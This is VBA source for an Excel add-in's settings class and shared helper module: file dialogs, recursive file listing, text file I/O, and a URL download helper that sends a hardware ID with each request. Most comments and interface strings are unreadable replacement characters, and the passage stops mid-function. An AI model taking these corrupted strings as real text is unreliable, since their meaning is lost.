Attribute VB_Name = "AddinSettings"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : AddinSettings
' Author        : EducatedFool                     Date: 04.06.2014
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/          ICQ: 5836318           Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit

Dim dic As New Dictionary

Private Sub Class_Initialize()
    Me.LoadAllSettings
End Sub
Private Sub Class_Terminate()
    Set dic = Nothing
End Sub

Sub LoadAllSettings()        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next: Dim arr As Variant, i&: Set dic = New Dictionary
    arr = GetAllSettings(PROJECT_NAME$, "Settings")
    If IsArray(arr) Then
        For i = LBound(arr) To UBound(arr)
            dic.Add arr(i, 0), arr(i, 1)
        Next i
    End If
End Sub


Function GetText(ByVal SettingName$, Optional ByVal DefValue As Variant) As String
    On Error Resume Next: If dic.Exists(SettingName$) Then GetText = dic.item(SettingName$) Else GetText = DefValue
End Function

Function GetNumber(ByVal SettingName$, Optional ByVal DefValue As Long) As Long
    On Error Resume Next: If dic.Exists(SettingName$) Then GetNumber = Val(dic.item(SettingName$)) Else GetNumber = DefValue
End Function

Function GetBoolean(ByVal SettingName$, Optional ByVal DefValue As Boolean) As Boolean
    On Error Resume Next: If dic.Exists(SettingName$) Then GetBoolean = CBool(dic.item(SettingName$)) Else GetBoolean = DefValue
End Function

Sub SetText(ByVal SettingName$, ByVal SettingValue As Variant)
    On Error Resume Next: SaveSetting PROJECT_NAME$, "Settings", SettingName$, SettingValue
    dic.item(SettingName$) = SettingValue
End Sub

Sub AddDefaultValue(ByVal SettingName$, ByVal SettingValue As Variant, _
                    Optional ConvertToColumn As Boolean = False, Optional AbsentOrBlank As Boolean = False)
    On Error Resume Next
    If (Not dic.Exists(SettingName$)) Or (AbsentOrBlank And IsSettingBlank(SettingName$)) Then
        If ConvertToColumn Then SettingValue = GetColumnName(Val(SettingValue))
        Me.SetText SettingName$, SettingValue
    End If
End Sub

Function IsSettingBlank(ByVal SettingName$) As Boolean
    IsSettingBlank = True
    If dic.Exists(SettingName$) Then If dic.item(SettingName$) <> "" Then IsSettingBlank = False
End Function

Sub SaveAllFromSettingsForm(ByRef UF As Object)
    On Error Resume Next: Dim ctrl As Object
    For Each ctrl In UF.Controls
        If ctrl.Enabled And Not (ctrl.Tag = "DoNotSave") Then
            If (Not ctrl.Name Like "CommandButton_*") And Not (ctrl.Tag = "ScrollCombo") Then
                Me.SetText ctrl.Name, ctrl.Value
            End If
        End If
    Next: Err.Clear
End Sub

Private Function GetColumnName(ByVal col As Long) As String
    GetColumnName = col & " |fffd|" & Split(Application.ConvertFormula("=r1c" & col, xlR1C1, xlA1), "$")(1) & "|fffd|"
End Function
Attribute VB_Name = "FWF"
'---------------------------------------------------------------------------------------
' Module        : mod_CommonFunctions
' |fffd||fffd||fffd||fffd||fffd|     : EducatedFool  (|fffd||fffd||fffd||fffd||fffd|)                    |fffd||fffd||fffd||fffd|: 26.07.2012
' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| Excel, Word, CorelDRAW. |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.
' http://ExcelVBA.ru/          ICQ: 5836318           Skype: ExcelVBA.ru
' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: http://ExcelVBA.ru/payments
'---------------------------------------------------------------------------------------

Option Private Module
Option Compare Text

Const FWF_VERSION = 2

#If Win64 Then
    #If VBA7 Then        ' Windows x64, Office 2010
        Declare PtrSafe Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" _
                (ByVal pCaller As LongLong, ByVal szURL As String, ByVal szFileName As String, _
                 ByVal dwReserved As LongLong, ByVal lpfnCB As LongLong) As LongLong
    #Else        ' Windows x64,Office 2003-2007
        Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" _
                                           (ByVal pCaller As LongLong, ByVal szURL As String, ByVal szFileName As String, _
                                            ByVal dwReserved As LongLong, ByVal lpfnCB As LongLong) As LongLong
    #End If
#Else
    #If VBA7 Then        ' Windows x86, Office 2010
        Declare PtrSafe Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" _
                (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, _
                 ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
    #Else        ' Windows x86, Office 2003-2007
        Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" _
                                           (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, _
                                            ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
    #End If
#End If

Function DownLoadFileFromURL(ByVal URL$, ByVal LocalPath$) As Boolean
    On Error Resume Next: Kill LocalPath$

    shortFilename$ = Mid(LocalPath$, InStrRev(LocalPath$, "\") + 1)
    If shortFilename$ <> Replace_symbols(shortFilename$) Then
        Debug.Print "Wrong symbols in filename: " & shortFilename$
        Exit Function
    End If

    Randomize        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    URL$ = URL$ & "?HID=" & HID & "&rnd=" & Left(Rnd(Now) * 1E+15, 10)

    DownLoadFileFromURL = URLDownloadToFile(0, URL$, LocalPath$, 0, 0) = 0
End Function

Function GetURLstatus(ByVal URL$, Optional ByVal timeout& = 2) As Long
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| URL$ (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd|), |fffd||fffd||fffd||fffd| 0, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' (200 - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, 404 - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, 403 - |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd|.|fffd|.)
    On Error Resume Next: URL$ = Replace(URL$, "\", "/")
    Dim xmlhttp As New WinHttpRequest
    xmlhttp.Open "GET", URL, True
    xmlhttp.setRequestHeader "If-Modified-Since", "Sat, 1 Jan 2000 00:00:00 GMT"
    xmlhttp.Send
    If xmlhttp.WaitForResponse(timeout) Then
        GetURLstatus = Val(xmlhttp.Status)
    Else
        GetURLstatus = 408        ' Request Timeout (|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
    End If
End Function

Function Extension(ByVal filename$) As String
    On Error Resume Next
    Extension = Split(filename$, ".")(UBound(Split(filename$, ".")))
End Function


Function GetFolderPath(Optional ByVal Title As String = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", _
                       Optional ByVal InitialPath As String = "c:\") As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Title,
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| InitialPath
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    Dim PS As String: PS = Application.PathSeparator
    With Application.FileDialog(msoFileDialogFolderPicker)
        If Not Right$(InitialPath, 1) = PS Then InitialPath = InitialPath & PS
        .ButtonName = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|": .Title = Title: .InitialFileName = InitialPath
        If .Show <> -1 Then Exit Function
        GetFolderPath = .SelectedItems(1)
        If Not Right$(GetFolderPath, 1) = PS Then GetFolderPath = GetFolderPath & PS
    End With
End Function

Function GetFilePath(Optional ByVal Title As String = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", _
                     Optional ByVal InitialPath As String = "c:\", _
                     Optional ByVal FilterDescription As String = "|fffd||fffd||fffd||fffd||fffd| Excel", _
                     Optional ByVal FilterExtension As String = "*.xls*") As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Title,
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| InitialPath
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    With Application.FileDialog(msoFileDialogOpen)
        .ButtonName = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|": .Title = Title: .InitialFileName = InitialPath
        .Filters.Clear: .Filters.Add FilterDescription, FilterExtension
        If .Show <> -1 Then Exit Function
        GetFilePath = .SelectedItems(1): PS = Application.PathSeparator
    End With
End Function

Function FilenamesCollection(ByVal FolderPath As String, Optional ByVal mask As String = "", _
                             Optional ByVal SearchDeep As Long = 999) As Collection
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| FolderPath,
    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| Mask (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|/|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
    ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| SearchDeep |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| SearchDeep=1, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|).
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    ' (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| GetAllFileNamesUsingFSO)

    Set FilenamesCollection = New Collection        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Set FSO = CreateObject("Scripting.FileSystemObject")        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| FileSystemObject
    GetAllFileNamesUsingFSO FolderPath, mask, FSO, FilenamesCollection, SearchDeep        ' |fffd||fffd||fffd||fffd||fffd|
    Set FSO = Nothing: Application.StatusBar = False        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel
End Function

Function GetAllFileNamesUsingFSO(ByVal FolderPath As String, ByVal mask As String, ByRef FSO, _
                                 ByRef FileNamesColl As Collection, ByVal SearchDeep As Long)
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| FolderPath, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| FSO
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| SearchDeep > 1
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| FileNamesColl
    On Error Resume Next: Set curfold = FSO.GetFolder(FolderPath)
    Const ExcludeFiles$ = "Thumbs.db, desktop.ini"
    If Not curfold Is Nothing Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|

        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel
        ' Application.StatusBar = "|fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|: " & FolderPath

        For Each fil In curfold.files        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| FolderPath
            If fil.Name Like "*" & mask Then
                If InStr(1, ExcludeFiles$, fil.Name, vbTextCompare) = 0 Then
                    If InStr(1, fil.Name, "~$", vbTextCompare) <> 1 Then
                        FileNamesColl.Add fil.Path
                    End If
                End If
            End If
        Next
        SearchDeep = SearchDeep - 1        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        If SearchDeep Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            For Each sfol In curfold.SubFolders        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| FolderPath
                GetAllFileNamesUsingFSO sfol.Path, mask, FSO, FileNamesColl, SearchDeep
            Next
        End If
        Set fil = Nothing: Set curfold = Nothing        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    End If
End Function

Function ReadTXTfile(ByVal filename As String) As String
    Set FSO = CreateObject("scripting.filesystemobject")
    Set ts = FSO.OpenTextFile(filename, 1, True): ReadTXTfile = ts.ReadAll: ts.Close
    Set ts = Nothing: Set FSO = Nothing
End Function

Function SaveTXTfile(ByVal filename As String, ByVal txt As String) As Boolean
    On Error Resume Next: Err.Clear
    Set FSO = CreateObject("scripting.filesystemobject")
    Set ts = FSO.CreateTextFile(filename, True)
    ts.Write txt: ts.Close
    SaveTXTfile = Err = 0
    Set ts = Nothing: Set FSO = Nothing
End Function

Function AddIntoTXTfile(ByVal filename As String, ByVal txt As String) As Boolean
    On Error Resume Next: Err.Clear
    Set FSO = CreateObject("scripting.filesystemobject")
    Set ts = FSO.OpenTextFile(filename, 8, True): ts.Write txt: ts.Close
    Set ts = Nothing: Set FSO = Nothing
    AddIntoTXTfile = Err = 0
End Function

Function SubFoldersCollection(ByVal FolderPath$, Optional ByVal mask$ = "*") As Collection
    Set SubFoldersCollection = New Collection        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Set FSO = CreateObject("Scripting.FileSystemObject")        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| FileSystemObject
    If Right(FolderPath$, 1) <> "\" Then FolderPath$ = FolderPath$ & "\"
    On Error Resume Next: Set curfold = FSO.GetFolder(FolderPath$)
    For Each folder In curfold.SubFolders        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| FolderPath
        If folder.Path Like FolderPath$ & mask$ Then SubFoldersCollection.Add folder.Path & "\"
    Next folder
    Set FSO = Nothing
End Function

Function GetFilenamesCollection(Optional ByVal Title As String = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", _
                                Optional ByVal InitialPath As String = "c:\") As FileDialogSelectedItems
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Title,
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| InitialPath
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    With Application.FileDialog(3)        ' msoFileDialogFilePicker
        .ButtonName = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|": .Title = Title: .InitialFileName = InitialPath
        If .Show <> -1 Then Exit Function
        Set GetFilenamesCollection = .SelectedItems
    End With
End Function

Function Replace_symbols(ByVal txt As String) As String
    st$ = "/\:?*|""<>"        ' |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: ~!@#$%^=`
    For i% = 1 To Len(st$)
        txt = Replace(txt, Mid(st$, i, 1), "_")
    Next
    Replace_symbols = txt
End Function

Function Replace_symbols2(ByVal txt As String) As String
    st$ = "/:?*|""<>"        ' |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: ~!@#$%^=`
    For i% = 1 To Len(st$)
        txt = Replace(txt, Mid(st$, i, 1), "_")
    Next
    Replace_symbols2 = txt
End Function

Sub OpenFolder(ByVal FolderPath$)
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| FolderPath$ |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Windows
    On Error Resume Next
    If CreateObject("Scripting.FileSystemObject").FolderExists(FolderPath$) Then
        CreateObject("wscript.shell").Run "explorer.exe /e, """ & FolderPath$ & """"
    Else
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|" & vbNewLine & IIf(FolderPath$ = "", "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", FolderPath$), _
               vbExclamation, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End If
End Sub

Sub ShowFile(ByVal FilePath$)
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| FilePath$ |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Windows
    On Error Resume Next
    CreateObject("wscript.shell").Run "explorer.exe /e,/select,""" & FilePath$ & """"
End Sub

Sub ShowText(ByVal txt As String, Optional ByVal index As Long)
    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| txt |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
    ' (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| text####.txt,
    ' |fffd||fffd||fffd| #### - |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| index, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 10-|fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)

    On Error Resume Next: Err.Clear
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    filename$ = Environ("TEMP") & "\text" & IIf(index, index, Left(Rnd() * 1E+15, 10)) & ".txt"
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd|
    With CreateObject("scripting.filesystemobject").CreateTextFile(filename, True)
        .Write txt: .Close
    End With
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
    CreateObject("wscript.shell").Run """" & filename$ & """"
End Sub

Function ChangeFileCharset(ByVal filename$, ByVal DestCharset$, _
                           Optional ByVal SourceCharset$) As Boolean
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
